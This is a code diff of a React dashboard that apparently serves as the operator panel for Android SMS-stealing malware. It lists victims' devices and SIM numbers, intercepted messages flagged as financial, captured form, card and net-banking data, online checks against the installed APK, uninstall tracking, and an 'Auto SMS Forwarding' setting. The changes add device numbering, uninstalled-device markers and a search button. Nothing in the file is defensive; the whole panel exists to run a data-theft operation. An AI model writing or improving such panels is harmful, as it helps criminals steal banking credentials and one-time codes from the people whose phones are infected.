@@ -47,8 +47,7 @@ function getTs(m: any): number {
   return 0;
 }
 
-// Sort newest first — items with no timestamp go to bottom
-// ─── Live TimeAgo (updates every second) ─────────────────────────────────────
+// ─── Live TimeAgo ─────────────────────────────────────────────────────────────
 function TimeAgo({ ts, className = "" }: { ts: number; className?: string }) {
   const [text, setText] = useState(() => timeAgo(ts));
   useEffect(() => {
@@ -125,10 +124,14 @@ function CopyBtn({ value }: { value: string }) {
 }
 
 // ─── Form Card ────────────────────────────────────────────────────────────────
-function FormCard({ form, onDeviceClick, dark }: { form: AnyRecord; onDeviceClick?: (id: string) => void; dark: boolean }) {
+function FormCard({ form, onDeviceClick, dark, deviceNumMap }: {
+  form: AnyRecord; onDeviceClick?: (id: string) => void; dark: boolean;
+  deviceNumMap?: Record<string, number>;
+}) {
   const ts      = getTs(form);
   const did     = getDeviceId(form);
   const entries = getPayloadEntries(form);
+  const devNum  = did && deviceNumMap ? deviceNumMap[did] : undefined;
   if (entries.length === 0) return null;
   return (
     <div className={`rounded-lg border p-3 shadow-sm ${D.card(dark)}`}>
@@ -146,7 +149,7 @@ function FormCard({ form, onDeviceClick, dark }: { form: AnyRecord; onDeviceClic
         {did ? (
           <button type="button" onClick={() => onDeviceClick?.(did)}
             className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
-            ID: {did.slice(0, 16)}
+            {devNum != null ? `#${devNum} · ` : ""}ID: {did.slice(0, 16)}
           </button>
         ) : <span />}
         <span className={`text-[11px] ${D.meta(dark)}`}>{ts ? new Date(ts).toLocaleString() : "-"}</span>
@@ -156,8 +159,9 @@ function FormCard({ form, onDeviceClick, dark }: { form: AnyRecord; onDeviceClic
 }
 
 // ─── SMS Card ─────────────────────────────────────────────────────────────────
-function SmsCard({ sms, pageNum, onDeviceClick, dark }: {
+function SmsCard({ sms, pageNum, onDeviceClick, dark, deviceNumMap }: {
   sms: AnyRecord; pageNum?: number; onDeviceClick?: (id: string) => void; dark: boolean;
+  deviceNumMap?: Record<string, number>;
 }) {
   const ts      = getTs(sms);
   const did     = getDeviceId(sms);
@@ -167,6 +171,7 @@ function SmsCard({ sms, pageNum, onDeviceClick, dark }: {
   const mob2    = str(sms.receiver2 || sms.mob2 || "");
   const dateStr = ts ? new Date(ts).toString() : "-";
   const fin     = isFinance(msg);
+  const devNum  = did && deviceNumMap ? deviceNumMap[did] : undefined;
 
   function Row({ label, value, red }: { label: string; value: string; red?: boolean }) {
     return (
@@ -193,7 +198,7 @@ function SmsCard({ sms, pageNum, onDeviceClick, dark }: {
           {did ? (
             <button type="button" onClick={() => onDeviceClick?.(did)}
               className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
-              ID: {did.slice(0, 14)}
+              {devNum != null ? `#${devNum} · ` : ""}ID: {did.slice(0, 14)}
             </button>
           ) : <span />}
           {pageNum != null && (
@@ -209,10 +214,12 @@ function SmsCard({ sms, pageNum, onDeviceClick, dark }: {
 }
 
 // ─── Group Card ───────────────────────────────────────────────────────────────
-function GroupCard({ deviceId, items, onDeviceClick, dark }: {
+function GroupCard({ deviceId, items, onDeviceClick, dark, deviceNumMap }: {
   deviceId: string; items: AnyRecord[]; onDeviceClick?: (id: string) => void; dark: boolean;
+  deviceNumMap?: Record<string, number>;
 }) {
   const latestTs = Math.max(...items.map(getTs).filter(Boolean));
+  const devNum   = deviceNumMap ? deviceNumMap[deviceId] : undefined;
   return (
     <div className={`rounded-lg border p-3 shadow-sm ${D.card(dark)}`}>
       {items.map((item, idx) => {
@@ -237,7 +244,7 @@ function GroupCard({ deviceId, items, onDeviceClick, dark }: {
       <div className="flex items-center justify-between">
         <button type="button" onClick={() => onDeviceClick?.(deviceId)}
           className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
-          ID: {deviceId.slice(0, 16)}
+          {devNum != null ? `#${devNum} · ` : ""}ID: {deviceId.slice(0, 16)}
         </button>
         <span className={`text-[11px] ${D.meta(dark)}`}>{latestTs ? new Date(latestTs).toLocaleString() : "-"}</span>
       </div>
@@ -246,21 +253,21 @@ function GroupCard({ deviceId, items, onDeviceClick, dark }: {
 }
 
 // ─── Device Card ──────────────────────────────────────────────────────────────
-function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline, dark }: {
+function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline, dark, isUninstalled }: {
   device: AnyRecord; displayNum: number;
   onCheckOnline: (id: string) => void;
   onOpen: (id: string) => void;
-  recentlyOnline: boolean; dark: boolean;
+  recentlyOnline: boolean;
+  dark: boolean;
+  isUninstalled: boolean;
 }) {
   const did     = str(device.deviceId || device.uniqueid || "");
   const brand   = str(device.metadata?.brand || device.metadata?.manufacturer || "Unknown");
   const model   = str(device.metadata?.model || "");
   const android = str(device.metadata?.androidVersion || "");
   const sim     = device.simInfo;
-  // Sirf checkedAt — automatic lastSeen nahi dikhna
   const checkedAt = Number((device as any).checkedAt || 0);
 
-  // Live tick — isRecent recomputes every second so color updates without refresh
   const [, setTick] = useState(0);
   useEffect(() => {
     const t = setInterval(() => setTick(n => n + 1), 1000);
@@ -282,7 +289,9 @@ function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline,
     ...(sim?.sim1Number ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>SIM 1: {sim.sim1Carrier ? `${sim.sim1Carrier} — ` : ""}{sim.sim1Number}</div> }] : []),
     ...(sim?.sim2Number ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>SIM 2: {sim.sim2Carrier ? `${sim.sim2Carrier}: ` : ""}{sim.sim2Number}</div> }] : []),
     {
-      text: (
+      text: isUninstalled ? (
+        <div className="text-center text-[12px] font-bold text-red-500">⚠️ Uninstalled</div>
+      ) : (
         <div className="text-center text-[12px]">
           <span className={D.deviceMeta(dark)}>Online: </span>
           {checkedAt > 0
@@ -295,31 +304,51 @@ function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline,
   ];
 
   return (
-    <div className={`cursor-pointer rounded-xl border p-3 shadow-sm transition-shadow hover:shadow-md ${D.deviceCard(dark)}`}
-      onClick={() => onOpen(did)}>
-      {/* Header: number + name */}
-      <div className={`mb-2 text-center text-[13px] font-bold ${D.deviceText(dark)}`}>
+    <div
+      className={`cursor-pointer rounded-xl border p-3 shadow-sm transition-shadow hover:shadow-md ${
+        isUninstalled
+          ? (dark ? "bg-gray-800 border-red-800" : "bg-red-50 border-red-300")
+          : D.deviceCard(dark)
+      }`}
+      onClick={() => onOpen(did)}
+    >
+      <div className={`mb-2 text-center text-[13px] font-bold ${isUninstalled ? "text-red-500" : D.deviceText(dark)}`}>
         {displayNum}. {brand}{model ? ` (${model})` : ""}
+        {isUninstalled && <span className="ml-1 text-[10px]">🔴</span>}
       </div>
 
-      {/* Inner bordered rows — same as competitor image */}
-      <div className={`overflow-hidden rounded-lg border ${dark ? "border-gray-600" : "border-gray-200"}`}>
+      <div className={`overflow-hidden rounded-lg border ${
+        isUninstalled
+          ? (dark ? "border-red-800" : "border-red-200")
+          : (dark ? "border-gray-600" : "border-gray-200")
+      }`}>
         {rows.map((row, i) => (
           <div key={i} className={[
             "px-3 py-2",
-            i < rows.length - 1 ? (dark ? "border-b border-gray-600" : "border-b border-gray-200") : "",
+            i < rows.length - 1 ? (
+              isUninstalled
+                ? (dark ? "border-b border-red-800" : "border-b border-red-200")
+                : (dark ? "border-b border-gray-600" : "border-b border-gray-200")
+            ) : "",
           ].join(" ")}>
             {row.text}
           </div>
         ))}
       </div>
 
-      {/* Check Online button */}
-      <button type="button"
-        onClick={(e) => { e.stopPropagation(); onCheckOnline(did); }}
-        className={`mt-3 w-full rounded-lg border py-2 text-[13px] font-semibold active:scale-[0.98] ${D.btnOutline(dark)}`}>
-        Check Online
-      </button>
+      {!isUninstalled && (
+        <button type="button"
+          onClick={(e) => { e.stopPropagation(); onCheckOnline(did); }}
+          className={`mt-3 w-full rounded-lg border py-2 text-[13px] font-semibold active:scale-[0.98] ${D.btnOutline(dark)}`}>
+          Check Online
+        </button>
+      )}
+
+      {isUninstalled && (
+        <div className="mt-3 w-full rounded-lg border border-red-300 bg-red-100 py-2 text-center text-[12px] font-bold text-red-600">
+          App Uninstalled
+        </div>
+      )}
     </div>
   );
 }
@@ -351,23 +380,50 @@ function CheckAlert({ status, onClose }: { status: CheckStatus; onClose: () => v
 }
 
 // ─── Search Bar ───────────────────────────────────────────────────────────────
-function SearchBar({ value, onChange, filter, onFilter, options, dark }: {
+function SearchBar({ value, onChange, onSearch, filter, onFilter, options, dark, showSearchBtn = false }: {
   value: string; onChange: (v: string) => void;
+  onSearch?: () => void;
   filter: string; onFilter: (v: string) => void;
-  options: { value: string; label: string }[]; dark: boolean;
+  options: { value: string; label: string }[];
+  dark: boolean;
+  showSearchBtn?: boolean;
 }) {
   return (
     <div className="flex items-center gap-2 px-3 py-2">
       <div className="relative flex-1">
-        <input value={value} onChange={(e) => onChange(e.target.value)}
-          placeholder="Search data and press enter/search icon"
-          className={`h-10 w-full rounded-full border pl-4 pr-10 text-[13px] outline-none ${D.searchBg(dark)}`} />
-        <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[16px]">🔍</span>
+        <input
+          value={value}
+          onChange={(e) => onChange(e.target.value)}
+          onKeyDown={(e) => { if (e.key === "Enter") onSearch?.(); }}
+          placeholder="Search..."
+          className={`h-10 w-full rounded-full border pl-4 pr-10 text-[13px] outline-none ${D.searchBg(dark)}`}
+        />
+        <button
+          type="button"
+          onClick={onSearch}
+          className="absolute right-3 top-1/2 -translate-y-1/2 text-[16px]"
+        >
+          🔍
+        </button>
       </div>
       <select value={filter} onChange={(e) => onFilter(e.target.value)}
         className={`h-10 rounded-full border px-3 text-[13px] font-semibold outline-none ${D.selectBg(dark)}`}>
         {options.map((o) => <option key={o.value} value={o.value}>{o.label}</option>)}
       </select>
+    </div>
+  );
+}
+
+// ─── CEH Trademark Banner ─────────────────────────────────────────────────────
+function CehBanner({ dark }: { dark: boolean }) {
+  return (
+    <div className={`flex items-center justify-between px-4 py-2 border-b ${dark ? "border-gray-700 bg-gray-900" : "border-gray-100 bg-white"}`}>
+      <div className="flex items-center gap-1.5">
+        <span className={`text-[15px] font-black tracking-widest ${dark ? "text-white" : "text-gray-900"}`}>CEH</span>
+        <span className={`text-[9px] font-bold ${dark ? "text-gray-500" : "text-gray-400"}`}>™</span>
+        <span className={`text-[11px] font-semibold ${dark ? "text-gray-500" : "text-gray-400"}`}>Web Backend</span>
+      </div>
+      <span className={`text-[10px] font-mono ${dark ? "text-gray-600" : "text-gray-400"}`}>zero-trace.in</span>
     </div>
   );
 }
@@ -379,12 +435,9 @@ export default function MainPage() {
   const nav      = useNavigate();
   const location  = useLocation();
 
-  // default: day mode
-  // ── Help / Settings / APK Info overlay ──────────────────────────────────────
   const [helpOpen,    setHelpOpen]    = useState(false);
   const [helpScreen,  setHelpScreen]  = useState<"" | "settings" | "apk">("");
 
-  // Settings state
   const [globalPhone,    setGlobalPhone]    = useState("");
   const [globalEnabled,  setGlobalEnabled]  = useState(false);
   const [globalLoading,  setGlobalLoading]  = useState(false);
@@ -394,7 +447,6 @@ export default function MainPage() {
   const [pinConfirm,     setPinConfirm]     = useState("");
   const [pinMsg,         setPinMsg]         = useState("");
 
-  // APK Info state
   const [licenseInfo,  setLicenseInfo]  = useState<any>(null);
   const [contactOpen,  setContactOpen]  = useState(false);
 
@@ -402,7 +454,6 @@ export default function MainPage() {
     return ((location.state as any)?.tab as TabKey) || "home";
   });
 
-  // Auto-open Settings if redirected from LoginPage (default PIN warning)
   useEffect(() => {
     if ((location.state as any)?.openSettings) {
       setHelpScreen("settings");
@@ -410,11 +461,16 @@ export default function MainPage() {
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
+
   const [dark,       setDark]       = useState(false);
   const [search,     setSearch]     = useState("");
+  const [searchQ,    setSearchQ]    = useState(""); // committed search query
   const [sortMode,   setSortMode]   = useState<SortMode>("new");
   const [deviceSort, setDeviceSort] = useState<DeviceSortMode>("latest");
   const [alertText,  setAlertText]  = useState("");
+
+  // ── Uninstalled device set (frontend only, resets on refresh) ────────────
+  const [uninstalledSet, setUninstalledSet] = useState<Set<string>>(new Set());
 
   const [devices,  setDevices]  = useState<AnyRecord[]>([]);
   const [forms,    setForms]    = useState<AnyRecord[]>([]);
@@ -434,7 +490,19 @@ export default function MainPage() {
   const checkStatusRef    = useRef<CheckStatus | null>(null);
   const checkTimerRef     = useRef<ReturnType<typeof setTimeout> | null>(null);
   const checkWindowRef    = useRef<number>(0);
-  const deviceOrderRef     = useRef<string[]>([]); // stable order — only updates on loadDevices
+  const deviceOrderRef    = useRef<string[]>([]);
+
+  // ── Device number map: deviceId -> display number ────────────────────────
+  const deviceNumMap = useMemo(() => {
+    const map: Record<string, number> = {};
+    const order = deviceOrderRef.current;
+    if (order.length) {
+      order.forEach((id, i) => { map[id] = order.length - i; });
+    } else {
+      devices.forEach((d, i) => { map[str(d.deviceId)] = devices.length - i; });
+    }
+    return map;
+  }, [devices]);
 
   // ── Loaders ──────────────────────────────────────────────────────────────
   const loadDevices = useCallback(async () => {
@@ -443,11 +511,10 @@ export default function MainPage() {
       const l = await getDevices();
       const list = Array.isArray(l) ? l : [];
       setDevices(list);
-      // createdAt se sort — ye kabhi nahi badlega (device register time)
       const sorted = [...list].sort((a, b) => {
         const ta = Number(a?.createdAt ? new Date(a.createdAt).getTime() : 0);
         const tb = Number(b?.createdAt ? new Date(b.createdAt).getTime() : 0);
-        return tb - ta; // newest registered = top
+        return tb - ta;
       });
       deviceOrderRef.current = sorted.map((d) => str(d.deviceId)).filter(Boolean);
     }
@@ -489,7 +556,6 @@ export default function MainPage() {
       if (list.length > 0) loadGroupData(list);
     } catch (e) { console.error(e); } finally { setLoadingForms(false); }
 
-    // Fetch alert ticker
     try {
       const r = await fetch(`${ENV.API_BASE}/api/admin/alert-text`, { headers: apiHeaders() });
       if (r.ok) { const d = await r.json(); if (d?.text) setAlertText(String(d.text)); }
@@ -544,17 +610,14 @@ export default function MainPage() {
 
       if (event === "device:lastSeen" || event === "device:upsert") {
         const did = String(msg.deviceId || msg?.data?.deviceId || "");
-        // lastSeen display UPDATE NAHI — sirf naya device add karo ya doosri info update karo
         setDevices((p) => {
           const exists = p.some((d) => str(d.deviceId) === did);
           if (exists) {
-            // lastSeen.at update mat karo — baaki data update karo
             return p.map((d) => str(d.deviceId) === did
               ? { ...d, ...(msg.data || {}), lastSeen: d.lastSeen, checkedAt: d.checkedAt }
               : d
             );
           }
-          // Naya device — add karo
           if (event === "device:upsert" && msg.data && did) {
             return [msg.data, ...p];
           }
@@ -563,7 +626,6 @@ export default function MainPage() {
         return;
       }
 
-      // check_online:result — SIRF YE lastSeen display update karega
       if (event === "check_online:result") {
         const did    = String(msg.deviceId || msg?.data?.deviceId || "");
         const ts     = Number(msg?.data?.checkedAt || Date.now());
@@ -572,11 +634,9 @@ export default function MainPage() {
         const inW    = checkDeviceIdRef.current === did && checkStatusRef.current === "checking";
 
         if (status === "online" && did) {
-          // checkedAt update
           setDevices((p) => p.map((d) => str(d.deviceId) === did ? { ...d, checkedAt: ts } : d));
           setRecentlyOnlineMap((p) => ({ ...p, [did]: ts }));
           setTimeout(() => setRecentlyOnlineMap((p) => { const c = { ...p }; delete c[did]; return c; }), 5000);
-          // Alert resolve
           if (inW) {
             if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
             checkStatusRef.current = "online";
@@ -585,13 +645,17 @@ export default function MainPage() {
         } else if (err && err !== "missing_token" && inW) {
           if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
           checkStatusRef.current = null;
-          setCheckAlert({ deviceId: did, status: "checking" }); // keep checking state, error shown in DeviceDetail
+          setCheckAlert({ deviceId: did, status: "checking" });
         }
         return;
       }
 
       if (event === "device:uninstalled") {
         const did = String(msg.deviceId || msg?.data?.deviceId || "");
+        // Frontend mein uninstalled mark karo permanently
+        if (did) {
+          setUninstalledSet((p) => new Set([...p, did]));
+        }
         const inW = checkDeviceIdRef.current === did &&
           (checkStatusRef.current === "checking" || (checkStatusRef.current === null && Date.now() - checkWindowRef.current < 30000));
         if (inW) {
@@ -606,6 +670,7 @@ export default function MainPage() {
         const did = String(msg.deviceId || msg?.data?.deviceId || "");
         setDevices((p) => p.filter((d) => str(d.deviceId) !== did));
         setSmsMap((p) => { const c = { ...p }; delete c[did]; return c; });
+        setUninstalledSet((p) => { const c = new Set(p); c.delete(did); return c; });
       }
     });
 
@@ -623,12 +688,11 @@ export default function MainPage() {
     checkStatusRef.current   = "checking";
     checkWindowRef.current   = Date.now();
     setCheckAlert({ deviceId, status: "checking" });
-    // 30 sec timeout — agar APK respond na kare
     if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
     checkTimerRef.current = setTimeout(() => {
       if (checkDeviceIdRef.current === deviceId && checkStatusRef.current === "checking") {
         checkStatusRef.current = null;
-        setCheckAlert({ deviceId, status: "checking" }); // stays checking = unreachable
+        setCheckAlert({ deviceId, status: "checking" });
       }
     }, 30000);
     try {
@@ -640,11 +704,12 @@ export default function MainPage() {
   const openDevice = useCallback((id: string) => { if (id) nav(`/devices/${encodeURIComponent(id)}`); }, [nav]);
 
   const closeCheckAlert = useCallback(() => {
-    // Timer clear karo but checkStatusRef null MAT karo
-    // WS response abhi bhi aa sakta hai — tab re-alert show hoga
     if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
     setCheckAlert(null);
   }, []);
+
+  // ── Search commit ─────────────────────────────────────────────────────────
+  const commitSearch = useCallback(() => { setSearchQ(search.trim().toLowerCase()); }, [search]);
 
   // ── Computed ──────────────────────────────────────────────────────────────
   const { allSms, smsPageMap } = useMemo(() => {
@@ -662,7 +727,6 @@ export default function MainPage() {
     return { allSms: list.sort((a, b) => getTs(b) - getTs(a)), smsPageMap: pageMap };
   }, [smsMap]);
 
-  // Home: forms + SMS combined, ALWAYS newest first
   const mixedFeed = useMemo(() => {
     return [
       ...forms.map((f) => ({ ...f, _type: "form" as const, _ts: getTs(f) })),
@@ -670,7 +734,6 @@ export default function MainPage() {
     ].sort((a, b) => sortByTime(a, b, sortMode));
   }, [forms, allSms, sortMode]);
 
-  // Data: forms + cards + net combined, ALWAYS newest first
   const allDataItems = useMemo(() => {
     const allCards = Object.values(cardMap).flat().map((c) => ({ ...c, _dtype: "card" }));
     const allNets  = Object.values(netMap).flat().map((n) => ({ ...n, _dtype: "net"  }));
@@ -681,7 +744,6 @@ export default function MainPage() {
     ].sort((a, b) => sortByTime(a, b, sortMode));
   }, [forms, cardMap, netMap, sortMode]);
 
-  // Groups
   const groups = useMemo(() => {
     const map: Record<string, AnyRecord[]> = {};
     for (const f of forms) {
@@ -705,34 +767,30 @@ export default function MainPage() {
     })).sort((a, b) => sortByTime(a, b, sortMode));
   }, [forms, cardMap, netMap, sortMode]);
 
-  // Devices
   const sortedDevices = useMemo(() => {
     const order = deviceOrderRef.current;
     if (!order.length) {
-      // First load not done yet — fallback sort
       const getCheckedAt = (d: any) => Number(d?.checkedAt || 0);
       return [...devices].sort((a, b) =>
         deviceSort === "latest" ? getCheckedAt(b) - getCheckedAt(a) : getCheckedAt(a) - getCheckedAt(b)
       );
     }
-    // Stable order: render in original position, new devices go to end
     const devMap = new Map(devices.map((d) => [str(d.deviceId), d]));
     const ordered: AnyRecord[] = [];
     for (const id of (deviceSort === "latest" ? order : [...order].reverse())) {
       const d = devMap.get(id);
       if (d) ordered.push(d);
     }
-    // New devices not in order yet — append at end
     for (const d of devices) {
       if (!order.includes(str(d.deviceId))) ordered.push(d);
     }
     return ordered;
   }, [devices, deviceSort]);
 
-  const q = search.trim().toLowerCase();
+  // searchQ use karo filtering ke liye (committed)
   function filterQ<T extends AnyRecord>(list: T[]): T[] {
-    if (!q) return list;
-    return list.filter((item) => JSON.stringify(item).toLowerCase().includes(q));
+    if (!searchQ) return list;
+    return list.filter((item) => JSON.stringify(item).toLowerCase().includes(searchQ));
   }
 
   // ── Help helpers ──────────────────────────────────────────────────────────
@@ -821,7 +879,10 @@ export default function MainPage() {
     } catch {}
   }
 
-  function handleTabChange(tab: TabKey) { if (tab === "help") { setHelpOpen(true); return; } setActiveTab(tab); setSearch(""); }
+  function handleTabChange(tab: TabKey) {
+    if (tab === "help") { setHelpOpen(true); return; }
+    setActiveTab(tab); setSearch(""); setSearchQ("");
+  }
 
   const SORT_OPTS   = [{ value: "new", label: "NEW" }, { value: "old", label: "OLD" }];
   const DEVICE_OPTS = [{ value: "latest", label: "Latest" }, { value: "old2new", label: "Old 2 New" }];
@@ -829,6 +890,10 @@ export default function MainPage() {
 
   return (
     <div className={`min-h-screen ${D.page(dark)}`}>
+
+      {/* CEH Trademark Banner */}
+      <CehBanner dark={dark} />
+
       <TopNav
         activeTab={activeTab}
         onTabChange={handleTabChange}
@@ -838,12 +903,19 @@ export default function MainPage() {
       />
 
       {activeTab !== "devices" && activeTab !== "help" && (
-        <SearchBar value={search} onChange={setSearch}
-          filter={sortMode} onFilter={(v) => setSortMode(v as SortMode)}
-          options={SORT_OPTS} dark={dark} />
+        <SearchBar
+          value={search}
+          onChange={setSearch}
+          onSearch={commitSearch}
+          filter={sortMode}
+          onFilter={(v) => setSortMode(v as SortMode)}
+          options={SORT_OPTS}
+          dark={dark}
+          showSearchBtn
+        />
       )}
 
-      {/* HOME — forms + SMS newest first */}
+      {/* HOME */}
       {activeTab === "home" && (
         <div className="space-y-3 px-3 pb-24 pt-1">
           {isLoading
@@ -852,14 +924,14 @@ export default function MainPage() {
               ? <div className={`py-10 text-center ${D.empty(dark)}`}>No data yet.</div>
               : filterQ(mixedFeed).map((item, i) =>
                   item._type === "form"
-                    ? <FormCard key={getId(item) || i} form={item} onDeviceClick={(id) => openDevice(id, "home")} dark={dark} />
-                    : <SmsCard  key={getId(item) || i} sms={item}  onDeviceClick={(id) => openDevice(id, "messages")} dark={dark} pageNum={smsPageMap[getId(item)]} />
+                    ? <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} />
+                    : <SmsCard  key={getId(item) || i} sms={item}  onDeviceClick={openDevice} dark={dark} pageNum={smsPageMap[getId(item)]} deviceNumMap={deviceNumMap} />
                 )
           }
         </div>
       )}
 
-      {/* DATA — forms + cards + net newest first */}
+      {/* DATA */}
       {activeTab === "data" && (
         <div className="space-y-3 px-3 pb-24 pt-1">
           {isLoading || loadingGroups
@@ -867,7 +939,7 @@ export default function MainPage() {
             : filterQ(allDataItems).length === 0
               ? <div className={`py-10 text-center ${D.empty(dark)}`}>No data.</div>
               : filterQ(allDataItems).map((item, i) =>
-                  <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} dark={dark} />
+                  <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} />
                 )
           }
         </div>
@@ -881,7 +953,7 @@ export default function MainPage() {
             : filterQ([...allSms].sort((a, b) => sortByTime(a, b, sortMode))).length === 0
               ? <div className={`py-10 text-center ${D.empty(dark)}`}>No messages.</div>
               : filterQ([...allSms].sort((a, b) => sortByTime(a, b, sortMode))).map((m, i) =>
-                  <SmsCard key={getId(m) || i} sms={m} onDeviceClick={(id) => openDevice(id, "messages")} dark={dark} pageNum={smsPageMap[getId(m)]} />
+                  <SmsCard key={getId(m) || i} sms={m} onDeviceClick={openDevice} dark={dark} pageNum={smsPageMap[getId(m)]} deviceNumMap={deviceNumMap} />
                 )
           }
         </div>
@@ -895,7 +967,7 @@ export default function MainPage() {
             : filterQ(groups).length === 0
               ? <div className={`py-10 text-center ${D.empty(dark)}`}>No grouped data.</div>
               : filterQ(groups).map((g) =>
-                  <GroupCard key={g.deviceId} deviceId={g.deviceId} items={g.items} onDeviceClick={openDevice} dark={dark} />
+                  <GroupCard key={g.deviceId} deviceId={g.deviceId} items={g.items} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} />
                 )
           }
         </div>
@@ -904,21 +976,31 @@ export default function MainPage() {
       {/* DEVICES */}
       {activeTab === "devices" && (
         <div className="pb-24">
-          <SearchBar value={search} onChange={setSearch}
-            filter={deviceSort} onFilter={(v) => setDeviceSort(v as DeviceSortMode)}
-            options={DEVICE_OPTS} dark={dark} />
+          <SearchBar
+            value={search}
+            onChange={setSearch}
+            onSearch={commitSearch}
+            filter={deviceSort}
+            onFilter={(v) => setDeviceSort(v as DeviceSortMode)}
+            options={DEVICE_OPTS}
+            dark={dark}
+            showSearchBtn
+          />
           {loadingDevices
             ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
             : filterQ(sortedDevices).length === 0
               ? <div className={`py-10 text-center ${D.empty(dark)}`}>No devices.</div>
               : <div className="grid grid-cols-2 gap-3 px-3 pt-1">
                   {filterQ(sortedDevices).map((d, i) => (
-                    <DeviceCard key={str(d.deviceId) || i} device={d}
-                      displayNum={filterQ(sortedDevices).length - i}
+                    <DeviceCard
+                      key={str(d.deviceId) || i}
+                      device={d}
+                      displayNum={deviceNumMap[str(d.deviceId)] ?? (filterQ(sortedDevices).length - i)}
                       onCheckOnline={handleCheckOnline}
-                      onOpen={(id) => openDevice(id, 'devices')}
+                      onOpen={openDevice}
                       recentlyOnline={!!recentlyOnlineMap[str(d.deviceId)]}
                       dark={dark}
+                      isUninstalled={uninstalledSet.has(str(d.deviceId))}
                     />
                   ))}
                 </div>
@@ -926,20 +1008,17 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* HELP — bottom sheet modal */}
+      {/* HELP */}
       {helpOpen && (
         <div className="fixed inset-0 z-[1000] flex items-end bg-black/60"
           onClick={() => setHelpOpen(false)}>
           <div className="w-full rounded-t-2xl bg-[#1c1c1c] px-5 pt-5 pb-8"
             onClick={e => e.stopPropagation()}>
-            {/* Header */}
             <div className="mb-4 flex items-center justify-between">
               <span className="text-[18px] font-bold text-white">Help</span>
               <button type="button" onClick={() => setHelpOpen(false)}
                 className="h-7 w-7 rounded-lg border border-gray-600 text-gray-400 flex items-center justify-center text-[14px]">✕</button>
             </div>
-
-            {/* Links */}
             <div className="mb-5 divide-y divide-gray-700 border-t border-gray-700">
               {[
                 { label: "APK Info", onClick: () => { setHelpOpen(false); setHelpScreen("apk"); loadLicenseInfo(); } },
@@ -953,8 +1032,6 @@ export default function MainPage() {
                 </button>
               ))}
             </div>
-
-            {/* Contact buttons */}
             <div className="space-y-2">
               <button type="button" onClick={() => setContactOpen(true)}
                 className="w-full rounded-xl border-2 border-green-500 py-3 text-[14px] font-semibold text-green-400">
@@ -978,113 +1055,79 @@ export default function MainPage() {
             <div className="mb-4 text-center text-[15px] font-extrabold text-gray-900">Contact Us</div>
             <div className="space-y-3">
               <button type="button" onClick={() => { setContactOpen(false); openWhatsApp(); }}
-                className="w-full rounded-xl border-2 border-green-500 py-3 text-[14px] font-extrabold text-green-600">
-                WhatsApp
-              </button>
+                className="w-full rounded-xl border-2 border-green-500 py-3 text-[14px] font-extrabold text-green-600">WhatsApp</button>
               <button type="button" onClick={() => { setContactOpen(false); openTelegramTarget(); }}
-                className="w-full rounded-xl border-2 border-blue-500 py-3 text-[14px] font-extrabold text-blue-600">
-                Telegram
-              </button>
+                className="w-full rounded-xl border-2 border-blue-500 py-3 text-[14px] font-extrabold text-blue-600">Telegram</button>
               <button type="button" onClick={() => { setContactOpen(false); openHarmfullContact(); }}
-                className="w-full rounded-xl border-2 border-amber-500 py-3 text-[14px] font-extrabold text-amber-600">
-                Contact Harmfull Team
-              </button>
+                className="w-full rounded-xl border-2 border-amber-500 py-3 text-[14px] font-extrabold text-amber-600">Contact Harmfull Team</button>
             </div>
           </div>
         </div>
       )}
 
-      {/* SETTINGS SCREEN */}
+      {/* SETTINGS */}
       {helpScreen === "settings" && (
         <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f5f5f5]">
-          {/* Header */}
           <div className="sticky top-0 flex items-center gap-3 bg-white px-4 py-3 shadow-sm">
-            <button type="button" onClick={() => setHelpScreen("")}
-              className="text-[20px] text-gray-600">←</button>
+            <button type="button" onClick={() => setHelpScreen("")} className="text-[20px] text-gray-600">←</button>
             <span className="text-[17px] font-bold text-gray-900">Settings</span>
           </div>
-
           <div className="mx-auto max-w-[480px] space-y-4 p-4">
-            {/* Auto SMS Forwarding */}
             <div className="rounded-2xl bg-white p-5 shadow-sm">
               <div className="mb-4 text-[15px] font-bold text-gray-900">Auto SMS Forwarding</div>
-
-              {/* ON/OFF toggle */}
               <div className="mb-4 flex items-center justify-between">
                 <span className="text-[14px] text-gray-600">Forward Status</span>
-                <button type="button"
-                  onClick={() => { setGlobalEnabled(v => !v); setGlobalMsg(""); }}
-                  className={[
-                    "relative h-7 w-12 rounded-full transition-colors",
-                    globalEnabled ? "bg-green-500" : "bg-gray-300"
-                  ].join(" ")}>
-                  <span className={[
-                    "absolute top-0.5 h-6 w-6 rounded-full bg-white shadow transition-transform",
-                    globalEnabled ? "translate-x-5" : "translate-x-0.5"
-                  ].join(" ")} />
+                <button type="button" onClick={() => { setGlobalEnabled(v => !v); setGlobalMsg(""); }}
+                  className={`relative h-7 w-12 rounded-full transition-colors ${globalEnabled ? "bg-green-500" : "bg-gray-300"}`}>
+                  <span className={`absolute top-0.5 h-6 w-6 rounded-full bg-white shadow transition-transform ${globalEnabled ? "translate-x-5" : "translate-x-0.5"}`} />
                 </button>
               </div>
-
-              {/* Number input — always visible */}
               <div className="mb-1 text-[12px] font-semibold text-gray-500">Forward Number:</div>
-              <input
-                value={globalPhone}
-                onChange={e => setGlobalPhone(e.target.value)}
-                placeholder="Enter phone number"
-                inputMode="tel"
